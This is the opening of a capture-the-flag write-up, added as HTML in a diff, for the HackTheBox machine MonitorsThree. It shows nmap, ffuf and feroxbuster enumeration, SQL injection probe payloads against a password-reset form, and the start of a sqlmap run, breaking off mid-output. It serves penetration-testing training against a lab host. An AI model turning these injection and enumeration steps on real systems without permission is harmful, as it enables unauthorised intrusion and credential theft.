@@ -1,0 +1,1610 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: MonitorsThree</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-monitorsthree">htb-monitorsthree</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ffuf">ffuf</a> <a class="post-tag" href="/tags#subdomain">subdomain</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#cacti">cacti</a> <a class="post-tag" href="/tags#sqli">sqli</a> <a class="post-tag" href="/tags#sqlmap">sqlmap</a> <a class="post-tag" href="/tags#crackstation">crackstation</a> <a class="post-tag" href="/tags#cve-2024-25642">cve-2024-25642</a> <a class="post-tag" href="/tags#upload">upload</a> <a class="post-tag" href="/tags#webshell">webshell</a> <a class="post-tag" href="/tags#credentials">credentials</a> <a class="post-tag" href="/tags#duplicati">duplicati</a> <a class="post-tag" href="/tags#docker">docker</a> <a class="post-tag" href="/tags#sqlite">sqlite</a> <a class="post-tag" href="/tags#client-side-hashing">client-side-hashing</a> <a class="post-tag" href="/tags#iptables">iptables</a> <a class="post-tag" href="/tags#xsp">xsp</a> <a class="post-tag" href="/tags#mono">mono</a> <a class="post-tag" href="/tags#htb-monitors">htb-monitors</a> <a class="post-tag" href="/tags#htb-monitorstwo">htb-monitorstwo</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-01-18T14:45:00+00:00" itemprop="datePublished">Jan 18, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/01/18/htb-monitorsthree.html" style="color: #e6e6e6; text-decoration: none;">HTB: MonitorsThree</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/monitorsthree-cover.webp" type="image/webp"/>
+<img alt="MonitorsThree" class="include_image" loading="lazy" src="/img/monitorsthree-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>MonitorsThree, like the first two Monitors boxes, starts with an instance of Cacti. Before turning to that, I’ll abuse an SQL injection in the password reset functionality of the main site, leaking credentials from the DB. I’ll use those to get access to Cacti, and from there exploit a file upload vulnerability such that I can run arbitrary PHP code, and get RCE. I’ll get another password from the Cacti DB and pivot to the next user. For root, I’ll exploit an instance of Duplicati. I’ll show three different ways to abuse this, first by backing up the host root directory to read the flag, then by writing to the host file system, and finally by getting a shell in the Duplicati container and accessing the host filesystem from a shared volume in there. In Beyond Root, I’ll dig into port 8084, which was filtered in the initial scan, and still not responsive with a shell.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/622 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/monitorsthree" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">MonitorsThree</a> <a href="https://hackthebox.com/machines/monitorsthree" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-monitorsthree.webp" type="image/webp"/> <img alt="MonitorsThree" class="img-av" src="/icons/box-monitorsthree.png"/></picture></a><br/><a href="https://hackthebox.com/machines/monitorsthree" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1826635487903134081">24 Aug 2024</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">18 Jan 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/monitorsthree-diff.webp" type="image/webp"/><img alt="Rated difficulty for MonitorsThree" src="/img/monitorsthree-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/monitorsthree-radar.webp" type="image/webp"/><img alt="Radar chart for MonitorsThree" src="/img/monitorsthree-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:12:23</span><a href="https://app.hackthebox.com/users/260094" rel="noopener" target="_blank"><img alt="NLTE" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/260094" style="display: unset"/><span class="user-text" style="display: none"> NLTE</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:47:55</span><a href="https://app.hackthebox.com/users/114435" rel="noopener" target="_blank"><img alt="celesian" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/114435" style="display: unset"/><span class="user-text" style="display: none"> celesian</span></a><br/></td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/1253217" rel="noopener" target="_blank"><img alt="ruycr4ft" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/1253217" style="display: unset"/><span class="user-text" style="display: none"> ruycr4ft</span></a><br/> <a href="https://app.hackthebox.com/users/389926" rel="noopener" target="_blank"><img alt="kavigihan" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/389926" style="display: unset"/><span class="user-text" style="display: none"> kavigihan</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80) as well as a filtered port (8084):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.30
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 17:33 EDT
+Nmap scan report for 10.10.11.30
+Host is up (0.025s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+8084/tcp filtered websnp
+
+Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> 10.10.11.30
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 17:35 EDT
+Nmap scan report for 10.10.11.30
+Host is up (0.023s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
+|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://monitorsthree.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.77 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> version, the host is likely running Ubuntu jammy 22.04. There’s a redirect on 80 to <code class="language-plaintext highlighter-rouge">monitorsthree.htb</code>.</p>
+<h3 id="subdomain-brute-force">Subdomain Brute Force</h3>
+<p>Given the use of virtual host routing, I’ll use <code class="language-plaintext highlighter-rouge">ffuf</code> to brute force for any subdomains of <code class="language-plaintext highlighter-rouge">monitorsthree.htb</code> that respond differently than the default case:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-u</span> http://10.10.11.30 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.monitorsthree.htb"</span> <span class="nt">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-ac</span>
+<span class="go">
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.30
+ :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt                    
+ :: Header           : Host: FUZZ.monitorsthree.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]                           
+:: Progress: [19966/19966] :: Job [1/1] :: 1709 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
+</span></code></pre></div></div>
+<p>It quickly identifies <code class="language-plaintext highlighter-rouge">cacti.monitorsthree.htb</code>. I’ll add both to my local <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.30 monitorsthree.htb cacti.monitorsthree.htb
+</code></pre></div></div>
+<h3 id="monitorsthreehtb---tcp-80">monitorsthree.htb - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is for a network management company:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20240827174531129.webp" type="image/webp"/>
+<img alt="image-20240827174531129" class="include_image" loading="lazy" src="/img/image-20240827174531129.png" style="max-height: 400px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>There is a sales email on the page, <code class="language-plaintext highlighter-rouge">sales@monitorsthree.htb</code>. All but one of the links lead to places on the page. The “Login” link goes to <code class="language-plaintext highlighter-rouge">/login.php</code>:</p>
+<picture>
+<source srcset="/img/image-20240827174903825.webp" type="image/webp"/>
+<img alt="image-20240827174903825" class="include_image" loading="lazy" src="/img/image-20240827174903825.png"/>
+</picture>
+<p>The “Forgot password?” link leads to another form but on entering “0xdf”, it just reports failure:</p>
+<picture>
+<source srcset="/img/image-20240827175005057.webp" type="image/webp"/>
+<img alt="image-20240827175005057" class="include_image" loading="lazy" src="/img/image-20240827175005057.png"/>
+</picture>
+<p>When I try “admin”, it shows success:</p>
+<picture>
+<source srcset="/img/image-20240827175033986.webp" type="image/webp"/>
+<img alt="image-20240827175033986" class="include_image" loading="lazy" src="/img/image-20240827175033986.png"/>
+</picture>
+<p>This is a method to enumerate valid users. I won’t need it for this box, but it’s always worth checking.</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP response headers just show nginx:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.18.0 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 27 Aug 2024 21:42:21 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">13560</span>
+</code></pre></div></div>
+<p>The login page is PHP, and the main page also loads as <code class="language-plaintext highlighter-rouge">/index.php</code>, so it’s safe to say it’s a PHP site. The 404 page is the <a href="/cheatsheets/404#nginx">default nginx page 404 page</a>.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since I know the site is PHP. I’m also include <code class="language-plaintext highlighter-rouge">--dont-extract-links</code> because there’s a lot of results, and I want it to focus on brute forcing from the root, not links in the page:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="400"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://monitorsthree.htb <span class="nt">-x</span> php <span class="nt">--dont-extract-links</span>
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.4
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://monitorsthree.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.4
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        7l       12w      162c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/images =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/images/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/js =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/js/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      338l      982w    13560c http://monitorsthree.htb/
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/css =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/css/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       96l      239w     4252c http://monitorsthree.htb/login.php
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://monitorsthree.htb/admin/logout.php =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/login.php</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/images/blog =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/images/blog/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://monitorsthree.htb/admin/users.php =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/login.php</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        0l        0w        0c http://monitorsthree.htb/admin/db.php
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/fonts =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/fonts/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/images/services =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/images/services/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      338l      982w    13560c http://monitorsthree.htb/index.php
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/images =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/images/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/js =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/js/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/css =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/css/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/js/plugins =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/js/plugins/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/swf =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/swf/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/js/pages =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/js/pages/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/js/core =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/js/core/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/css/extras =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/css/extras/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/css/icons =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/css/icons/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/js/maps =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/js/maps/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       20l       36w      303c http://monitorsthree.htb/admin/footer.php
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://monitorsthree.htb/admin/dashboard.php =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/login.php</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://monitorsthree.htb/admin/customers.php =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/login.php</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/js/charts =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/js/charts/</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://monitorsthree.htb/admin/invoices.php =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/login.php</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/images/flags =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/images/flags/</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://monitorsthree.htb/admin/tasks.php =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/login.php</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/images/ui =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/images/ui/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/images/backgrounds =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/images/backgrounds/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      306l      960w    11647c http://monitorsthree.htb/css/css2
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        7l       12w      178c http://monitorsthree.htb/admin/assets/locales =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/admin/assets/locales/</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       85l      212w     3030c http://monitorsthree.htb/forgot_password.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      144l      370w     6248c http://monitorsthree.htb/admin/navbar.php
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c http://monitorsthree.htb/admin/changelog.php =&gt; </span><span class="feroxbuster-yellow">http://monitorsthree.htb/login.php</span><span class="go">
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 74s   420000/420000  0s      </span><span class="feroxbuster-green">found</span><span class="go">:38      </span><span class="feroxbuster-red">errors</span><span class="go">:0
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 70s    30000/30000   426/s   http://monitorsthree.htb/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 71s    30000/30000   424/s   http://monitorsthree.htb/images/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 71s    30000/30000   425/s   http://monitorsthree.htb/js/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 70s    30000/30000   427/s   http://monitorsthree.htb/admin/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 71s    30000/30000   425/s   http://monitorsthree.htb/css/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 70s    30000/30000   428/s   http://monitorsthree.htb/images/blog/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 71s    30000/30000   425/s   http://monitorsthree.htb/admin/assets/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 70s    30000/30000   427/s   http://monitorsthree.htb/fonts/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 70s    30000/30000   427/s   http://monitorsthree.htb/images/services/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 70s    30000/30000   426/s   http://monitorsthree.htb/admin/assets/images/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 70s    30000/30000   428/s   http://monitorsthree.htb/admin/assets/js/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 70s    30000/30000   428/s   http://monitorsthree.htb/admin/assets/css/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 70s    30000/30000   428/s   http://monitorsthree.htb/admin/assets/swf/
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 69s    30000/30000   438/s   http://monitorsthree.htb/admin/assets/locales/ 
+</span></code></pre></div></div>
+<p>The only really interesting part is <code class="language-plaintext highlighter-rouge">/admin</code> and files in it. Everything in <code class="language-plaintext highlighter-rouge">/admin</code> seems to redirect to <code class="language-plaintext highlighter-rouge">/login.php</code>.</p>
+<h3 id="cactimonitorsthreehtb">cacti.monitorsthree.htb</h3>
+<h4 id="site-1">Site</h4>
+<p>This domain provides a login form for an instance of Cacti:</p>
+<picture>
+<source srcset="/img/image-20240827175907054.webp" type="image/webp"/>
+<img alt="image-20240827175907054" class="include_image" loading="lazy" src="/img/image-20240827175907054.png"/>
+</picture>
+<p>Without creds there’s not much else here.</p>
+<h4 id="tech-stack-1">Tech Stack</h4>
+<p>The HTTP response headers don’t show anything interesting, just nginx. The site is clearly running the PHP-based monitoring application <a href="https://www.cacti.net/">Cacti</a>, just like <a href="/2021/10/09/htb-monitors.html#">Monitors</a> and <a href="/2023/09/02/htb-monitorstwo.html#">MonitorsTwo</a>. This time it’s version 1.2.26. I don’t find any interesting pre-authentication CVEs against this version.</p>
+<p>I will pass on brute forcing paths on the site for now, as the <a href="https://github.com/Cacti/cacti">source</a> is on GitHub.</p>
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+<h3 id="recover-admin-password">Recover Admin Password</h3>
+<h4 id="identify-sqli-injection">Identify SQLI Injection</h4>
+<p>On the main site, I’ll check each of the user inputs for SQL injection. The login form seems fine, but when I enter <code class="language-plaintext highlighter-rouge">0xdf'</code> as the username for the password recovery, it returns an error:</p>
+<picture>
+<source srcset="/img/image-20240827180641541.webp" type="image/webp"/>
+<img alt="image-20240827180641541" class="include_image" loading="lazy" src="/img/image-20240827180641541.png"/>
+</picture>
+<h4 id="attempt-at-union">Attempt at Union</h4>
+<p>I can try to do a UNION injection by guessing at the number of columns, starting with <code class="language-plaintext highlighter-rouge">' union select 1;-- -</code>:</p>
+<picture>
+<source srcset="/img/image-20240827181011667.webp" type="image/webp"/>
+<img alt="image-20240827181011667" class="include_image" loading="lazy" src="/img/image-20240827181011667.png"/>
+</picture>
+<p>I’ll add numbers until I get to <code class="language-plaintext highlighter-rouge">' union select 1,2,3,4,5,6,7,8,9;-- -</code>, it works, but it doesn’t return any data to the user:</p>
+<picture>
+<source srcset="/img/image-20240827180939721.webp" type="image/webp"/>
+<img alt="image-20240827180939721" class="include_image" loading="lazy" src="/img/image-20240827180939721.png"/>
+</picture>
+<p>I’ll need to use a blind technique.</p>
+<h4 id="sqlmap">sqlmap</h4>
+<p>At this point it’s easier to move to <code class="language-plaintext highlighter-rouge">sqlmap</code> to automate the injection. I’ll find a request in Burp with no injection and right click, “Copy to file”:</p>
+<picture>
+<source srcset="/img/image-20240827181423345.webp" type="image/webp"/>
+<img alt="image-20240827181423345" class="include_image" loading="lazy" src="/img/image-20240827181423345.png"/>
+</picture>
+<p>Now I’ll pass that file to <code class="language-plaintext highlighter-rouge">sqlmap</code> and let it find the injection:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sqlmap <span class="nt">-r</span> reset.request <span class="nt">--batch</span>
+<span class="sqlmap-header-yellow">        ___
+       __H__
+ ___ ___[</span><span class="sqlmap-header-red">)</span><span class="sqlmap-header-yellow">]_____ ___ ___  </span><span class="go">{</span><span class="sqlmap-header-blue">1.8.4#stable</span><span class="go">}</span><span class="sqlmap-header-yellow">
+|_ -| . [</span><span class="sqlmap-header-red">(</span><span class="sqlmap-header-yellow">]     | .'| . |
+|___|_  [</span><span class="sqlmap-header-red">.</span><span class="sqlmap-header-yellow">]_|_|_|__,|  _|
+      |_|V...       |_|   </span><span class="go">https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:12:47 /2024-08-27/
+
+[</span><span class="sqlmap-timestamp">18:12:47</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] parsing HTTP request from 'reset.request'
+[</span><span class="sqlmap-timestamp">18:12:47</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing connection to the target URL
+got a 302 redirect to 'http://monitorsthree.htb/forgot_password.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+[</span><span class="sqlmap-timestamp">18:12:47</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing if the target URL content is stable
+[</span><span class="sqlmap-timestamp">18:12:47</span><span class="go">] [</span><span class="sqlmap-warn">WARNING</span><span class="go">] POST parameter 'username' does not appear to be dynamic
+[</span><span class="sqlmap-timestamp">18:12:48</span><span class="go">] [</span><span class="sqlmap-warn">WARNING</span><span class="go">] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[</span><span class="sqlmap-timestamp">18:12:48</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing for SQL injection on POST parameter 'username'
+[</span><span class="sqlmap-timestamp">18:12:48</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[</span><span class="sqlmap-timestamp">18:12:49</span><span class="go">] [</span><span class="sqlmap-info">INFO</span><span class="go">] testing 'Boolean-based blind - Parameter replace (original value)'
